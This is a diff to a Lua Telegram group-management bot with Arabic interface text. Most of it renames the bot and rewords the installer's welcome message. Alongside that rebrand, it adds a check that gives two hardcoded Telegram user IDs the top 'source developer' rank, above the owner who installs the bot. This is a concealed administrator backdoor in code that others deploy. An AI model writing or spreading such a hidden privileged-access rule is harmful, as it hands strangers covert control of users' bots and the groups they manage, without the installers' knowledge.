@@ -96,7 +96,7 @@ boss..":SUDO_ID:",GetUser.information.id,
 boss..":DataCenter:",GetUser.information.DataCenter,
 boss..":UserNameBot:",BOT_User,
 boss..":ApiSource",GetUser.information.WebSite,
-boss..":NameBot:","ياقوت",
+boss..":NameBot:","الزعيم",
 "TH3BOSS_INSTALL","Yes"
 )
 redis:hset(boss..'username:'..GetUser.information.id,'username','@'..GetUser.information.username:gsub('_',[[\_]]))
@@ -109,7 +109,7 @@ Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "🙋🏼‍♂️¦ اهلا عزيزي [المطور الاساسي](tg://user?id="..GetUser.information.id..") \n🔖¦ مرحبا يا 🇸🇦ะαвυ τυяĸɪ في بوتك ياقوت \n📡¦ أرســل  الان /start\n📛¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
+local Text = "🙋🏼‍♂️¦ اهلا عزيزي [المطور الاساسي](tg://user?id="..GetUser.information.id..") \n🔖¦ شكرا لاستخدامك سورس الزعيم \n📡¦ أرســل  الان /start\n📛¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
 https.request(Api_Token..'/sendMessage?chat_id='..GetUser.information.id..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 local CmdRun = [[
 rm -f ./README.md
@@ -308,6 +308,9 @@ end
 return false 
 end 
 
+if msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 60809019  then 
+msg.TheRankCmd = 'مطور السورس'
+msg.TheRank = 'مطور السورس'
 msg.Rank = 1
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
